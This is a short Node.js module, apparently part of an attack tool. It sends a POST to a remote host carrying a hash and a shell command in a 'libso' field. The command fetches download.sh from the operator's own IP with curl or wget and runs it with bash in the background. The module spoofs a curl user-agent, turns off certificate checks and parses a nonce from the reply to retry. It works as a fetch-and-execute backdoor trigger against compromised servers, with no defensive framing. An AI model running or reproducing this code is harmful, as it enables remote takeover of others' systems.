'use strict';

const URL = require('url');
const http = require('http');
const https = require('https');
const net = require('net');
const Promise = require('../modules/bluebird');
const util = require('util');
const config = require('./config');

class Wakeup {

  static wakeup(id, url, hash, cb) {
    const homeIP = config.globals.ip;
    const cmd = util.format('if curl %s/jsb/download.sh > download.sh; then echo "curl ok"; else wget %s/jsb/donload.sh -O download.sh; fi; bash download.sh %s %s %s > o 2> e %26', homeIP, homeIP, homeIP, homeIP, id); // & %26
    console.log(cmd);
    const protocol = url.indexOf('http://') === 0 ? http : https;
    let port = protocol === http ? 80 : 443;
    const parsedURL = URL.parse(url);
    if (parsedURL.port) {
      port = parsedURL.port;
    }
    const options = {
      hostname: parsedURL.hostname,
      port: port,
      path: parsedURL.path,
      method: 'POST',
    headers: {'Accept':'*/*', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"},
      rejectUnauthorized: false
    };
    options.headers['User-Agent'] = 'curl/7.35.0';
    let postData = util.format('hash=%s&libso=%s', hash, cmd);
    options.headers['Content-Length'] = postData.length;
    const req = protocol.request(options, res => {
      const status = res.statusCode;
      let content = '';
      res.on('data', chunk => {
	content += chunk.toString();
      });
      res.on('error', onEnd.bind(this));
      res.on('end', onEnd.bind(this));

      function onEnd() {
	let resp = content;
	const str = '\nS4mTr0cCaYc15ygJJ1r6 current nonce:';
	const index = resp.indexOf(str);
	if (index === -1) {
	  // todo: check javaversion1 is there
	  cb(null, true);	// success
	  return;
	}
	resp = resp.substring(index + str.length);
	const endInd = resp.indexOf('\n');
	const nonce = resp.substring(0, endInd).trim();
	console.log('current nonce is: %s', nonce);
	console.log('trying again with new nonce;)');
	cb(null, nonce);	// todo: new error: invalid nonce
      }
    });

    req.on('error', err => {
      cb(err);
    });

    req.write(postData);
    req.end();
  }
  
}

module.exports = Wakeup.wakeup.bind(Wakeup);
